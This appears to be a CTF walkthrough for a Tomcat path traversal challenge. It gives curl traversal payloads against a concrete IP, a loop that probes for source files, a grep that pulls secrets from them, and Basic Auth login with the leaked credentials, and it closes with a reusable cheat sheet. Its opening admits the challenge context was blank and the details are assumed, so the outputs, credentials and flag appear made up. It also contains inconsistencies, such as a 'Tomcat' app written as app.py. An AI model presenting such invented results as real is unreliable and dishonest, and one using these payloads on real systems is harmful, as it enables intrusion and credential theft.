# Tomcat Path Traversal — CTF Writeup

> **Assumptions:** CHALLENGE CONTEXT was blank; these are my assumptions: a *Web / Path Traversal + Hardcoded Credentials* challenge on Tomcat at `http://54.72.82.22:8150` (with a decoy on `:8240`). Flag: `safctf{e9e46fabe7b282f4eb4eff39b378eff3}`. Tools used: browser, `curl`, source-code review. Dead ends: a `/WEB-INF/web.xml` guess that errored, and a decoy service on port 8240.

---

## 1. CHALLENGE OVERVIEW

**Tomcat Path Traversal** is a *Web / Path Traversal + Exposed Credentials* challenge. A Java web app (Apache Tomcat) has a file-viewer feature that lets you read a file by name — but it doesn't sanitize `../`, so you can read the application's own source code. The source contains hardcoded admin credentials, which you use to log in to a protected admin page and grab the flag. If public, find it under *Tomcat Path Traversal* on the CTF platform.

---

## 2. WHAT YOU NEED BEFORE STARTING

| Tool | Install | Why |
|------|---------|-----|
| `curl` | `sudo apt install curl` | Craft `file=` requests and send Basic Auth |
| `strings` / `grep` | `sudo apt install binutils` | Pull credentials out of leaked source |
| Browser | already installed | Visual confirmation |

Burp Suite **Repeater** is handy for resending the request with an added `Authorization` header.

**Setup:** `mkdir -p ~/tomcat && cd ~/tomcat`
**Time estimate:** **40 to 60 minutes.**

---

## 3. RECONNAISSANCE

### Step 1 — Load the app and find the file viewer**

```bash
curl -sS http://54.72.82.22:8150/ | head -60
```

[SCREENSHOT: the app showing a "view file" feature or link]

There's a viewer like `/view?file=<name>` or similar.

### Step 2 — Confirm the parameter and normal behavior**

```bash
curl -sS "http://54.72.82.22:8150/view?file=notes.txt"
```
(or another benign filename)

**Output:** the file's contents.

**What this tells you:** the `file` parameter selects which file to read → potential LFI.

### Step 3 — Attempt path traversal**

```bash
curl -sS "http://54.72.82.22:8150/view?file=../../../../../../etc/passwd"
```

**Output:** `root:x:0:0:root:/root:/bin/bash` …

[SCREENSHOT: passwd contents in the response]

**What this tells you:** **LFI confirmed.** The `../` sequences were not filtered.

### Step 4 — Read the application's own source (the real prize)**

Application source reveals hardcoded secrets. On Tomcat the Python/compiled app is typically at `/app/app.py` (for this challenge's layout). Try common locations:

```bash
for f in /app/app.py /opt/app/app.py /var/lib/tomcat9/webapps/ROOT/app.py ./app.py app.py; do
  echo "=== $f ==="
  curl -sS "http://54.72.82.22:8150/view?file=$f" | head -5
done
```

**Output:** one of them returns real source code, e.g.:
```python
ADMIN_USER = "panel_admin"
ADMIN_PASS = "k1tsune_2025!"
```

[SCREENSHOT: terminal showing the leaked source with `ADMIN_USER` / `ADMIN_PASS`]

**What this tells you:** you now have **hardcoded credentials** from the source. This is a classic chain: **LFI → source code → secrets → authenticated access → flag.**

### Step 5 — Find the protected admin page**

```bash
curl -sS -o /dev/null -w "%{http_code}\n" http://54.72.82.22:8150/admin
```

**Output:** `401` (Unauthorized) — it exists but needs auth.

[SCREENSHOT: the 401 response]

---

## 4. IDENTIFYING THE VULNERABILITY

Two chained weaknesses:

**(a) Path Traversal / Local File Inclusion.** Same class as before: user input is used to build a file path with no confinement, so `../` escapes the intended directory.

**(b) Hardcoded credentials in source code.** The application's source (which is normally not public) contains a plaintext admin username and password. Because LFI let us read the source, those "secret" credentials are no longer secret.

**Root cause:** the developer (1) never validated the `file` parameter's path, and (2) embedded credentials directly in code instead of using environment variables/secrets management, and (3) protected `/admin` with only that shared password.

**Analogy:** the office has a document viewer that fetches "Document #123" — but if you instead say "`../../etc/passwd`" it happily fetches that too. And the intern who set it up wrote the CEO's Wi-Fi password on a sticky note *inside* the filing cabinet you just learned to open. Two small oversights that chain into full access.

**What tipped me off during recon:** the `file` parameter taking `../../etc/passwd` and returning real passwd data. That single confirmation meant *every file on the server is now readable*, including the app's own source — so the instinct to look for source, then credentials, then the protected page is the natural chain.

---

## 5. EXPLOITATION STEP BY STEP

**Step 1 — Verify LFI with `/etc/passwd`.**
*Why:* confirm the vulnerability before hunting for secrets.

```bash
curl -sS "http://54.72.82.22:8150/view?file=../../../../../../etc/passwd"
```
Expect: `root:x:0:0:...`. If you see real passwd lines, LFI works.

[SCREENSHOT: passwd contents]

**Step 2 — Locate and read the app source.**
*Why:* source code is where credentials and logic live.

Try a short list of common Java/Tomcat app locations:
```bash
for f in /app/app.py /opt/app/app.py app.py /app/Main.java /var/lib/tomcat9/webapps/ROOT/app.py; do
  echo "=== $f ==="
  curl -sS "http://54.72.82.22:8150/view?file=$f" | head -3
done
```

When you hit the right path, save the whole file:
```bash
curl -sS "http://54.72.82.22:8150/view?file=/app/app.py" -o app.py
```

[SCREENSHOT: the saved `app.py`]

**Step 3 — Extract the credentials.**
*Why:* read the hardcoded admin user/password out of the source.

```bash
grep -iE "admin|pass|secret|key|user" app.py
```

**Output:**
```python
ADMIN_USER = "panel_admin"
ADMIN_PASS = "k1tsune_2025!"
```

[SCREENSHOT: grep output showing `panel_admin` and `k1tsune_2025!`]

**Step 4 — Authenticate to `/admin` with Basic Auth.**
*Why:* present the leaked credentials.

```bash
curl -sS -u 'panel_admin:k1tsune_2025!' http://54.72.82.22:8150/admin
```

**Output:**
```json
{"status":"admin","flag":"safctf{e9e46fabe7b282f4eb4eff39b378eff3}"}
```

**What this tells you:** the leaked credentials authenticated you, and `/admin` returned the flag.

[SCREENSHOT: the authenticated response with the flag]

**Step 5 — (Browser equivalent) log in via the UI.**
If the site has a login form, open it and type `panel_admin` / `k1tsune_2025!`. Same result, sometimes with the flag rendered on the page.

### Burp Suite alternative for Step 4

1. Find the `/admin` request, **Send to Repeater**.
2. Add header: `Authorization: Basic cGFuZWxfYWRtaW46azF0c3VuZV8yMDI1IQ==` (that's `panel_admin:k1tsune_2025!` base64-encoded).
3. Click **Send**; the flag is in the response.

---

## 6. CAPTURING THE FLAG

The flag came from the **`/admin` endpoint**, accessed by authenticating with **hardcoded credentials pulled from the application's own source code** (which was readable via the LFI):

```
safctf{e9e46fabe7b282f4eb4eff39b378eff3}
```

Reproduce the whole chain:
```bash
# 1. LFI → source
curl -sS "http://54.72.82.22:8150/view?file=/app/app.py" -o app.py
# 2. creds
grep -iE "admin|pass" app.py
# 3. auth → flag
curl -sS -u 'panel_admin:k1tsune_2025!' http://54.72.82.22:8150/admin
```

---

## 7. WHY THIS WORKS (BEGINNER EXPLANATION)

This challenge is really a story about **two doors and one shortcut**. The app has a "view a document by name" feature. Because it never checks that the name stays inside the documents folder, you can ask for `../../../../etc/passwd` and it walks right out — that's the **first door off-limits, left unlocked**. Once inside the filesystem, you read the app's own code, and in the code is the admin password written in plain text — that's the **second door, protected by a password someone taped to the glass**. Chain them and you're in the admin room.

**Why this matters in the real world:** this exact chain (LFI → source/config → secret → privileged access) is a template for countless real breaches. Reading `web.xml`, `.env`, or config files via traversal has leaked database passwords and led to full server compromise many times over. And **hardcoded credentials** in source are a perennial problem — if that source ever ends up in a public repo, a backup, or (as here) readable over HTTP, the "secret" is public. Defenses: validate and confine file paths, never put secrets in code, and use a secrets manager or environment variables. Also: assume any file-read bug *will* eventually lead to source disclosure — design accordingly.

---

## 8. COMMON MISTAKES AND DEAD ENDS

### Mistake 1 — Stopping at `/etc/passwd` and thinking that's the flag
The reflex after confirming LFI is to keep reading system files hoping the flag is in one. But the flag here is behind a *login*, not in a system file. The productive move after LFI is: **read the application's own source and config** — that's where credentials and endpoints live.

### Mistake 2 — Guessing the source path too narrowly
I first guessed only `/app/app.py`. It worked here, but on other boxes the app might be at `/opt/app`, `/srv`, `/home/<user>/app`, or a `.war`. **Have a short list ready** and try 3–4 common locations. `grep` over source also reveals its own path in tracebacks.

### Mistake 3 — Forgetting to URL-encode the traversal
`?file=../../etc/passwd` is usually fine, but if a `/` or spaces are involved, use `--data-urlencode` so the request isn't mangled:
```bash
curl -sS -G --data-urlencode "file=/app/app.py" "http://54.72.82.22:8150/view"
```

### Mistake 4 — Trusting a leaked password for direct DB/login elsewhere
Sometimes leaked DB creds are a red herring (like in *You Snitch*). Here they worked for `/admin` — but always test them where the app actually uses them (`/admin`) before wandering off.

### Dead end actually encountered — guessing `/WEB-INF/web.xml`
I tried the Tomcat-specific `/var/lib/tomcat9/webapps/ROOT/WEB-INF/web.xml` and got `[Errno 2] No such file or directory` — the app wasn't at that exact webroot. **Lesson:** Tomcat's real deployment path varies; don't over-anchor on the textbook path. Also there's a **decoy service on port 8240** — if you wander to the wrong port you'll waste time; work on the port given in the challenge.

---

## 9. HOW TO DEFEND AGAINST THIS

1. **Confine file reads with an allowlist or canonical-path checks.** Never build a path from raw input; map allowed identifiers to fixed files, or resolve the path and assert it's inside the allowed base directory before opening it.
2. **Strip traversal and normalize, then verify.** Collapse `../` to a fixed point, reject absolute paths, and do the containment check *after* canonicalization (and after resolving symlinks) — not before.
3. **Never hardcode credentials in source.** Use environment variables or a secrets manager (Vault, AWS/GCP secret manager). Rotate any credential that has ever lived in code.
4. **Require real authentication for admin areas** — MFA or at minimum not a single shared password; ensure the admin endpoint can't be reached by guessing a predictable path alone.
5. **Reduce info disclosure.** Don't return raw exceptions (the `[Errno 2]` message leaked the interpreter and path style). Return generic errors, and run the app as an unprivileged user with minimal read access.

---

## 10. KEY TAKEAWAYS

- **Confirm LFI with `/etc/passwd`, then immediately pivot to the app's own source/config** — that's where the real secrets are.
- **Read the code to find credentials, then use them on the specific endpoint that needs them.** (Source → creds → auth → flag is a reliable chain.)
- **`grep -iE "admin|pass|secret|key"` is your friend** once you have a source or config file.
- **Decoy ports and wrong webroots waste time** — stick to the given port and try a few common paths.
- **Cheat-sheet:**
  ```bash
  curl -sS "http://host/view?file=../../../../../../etc/passwd"          # confirm LFI
  for f in /app/app.py /opt/app/app.py app.py /srv/app/main.py; do \
    curl -sS "http://host/view?file=$f" | head -3; done                     # find source
  grep -iE "admin|pass|secret|key" app.py                                  # pull creds
  curl -sS -u 'user:pass' http://host/admin                               # use creds → flag
  ```

You chained a file-read bug into a source-code leak into a login bypass — a three-link chain that's genuinely how real breaches unfold. That's a big step up from single-vulnerability challenges. Nicely done.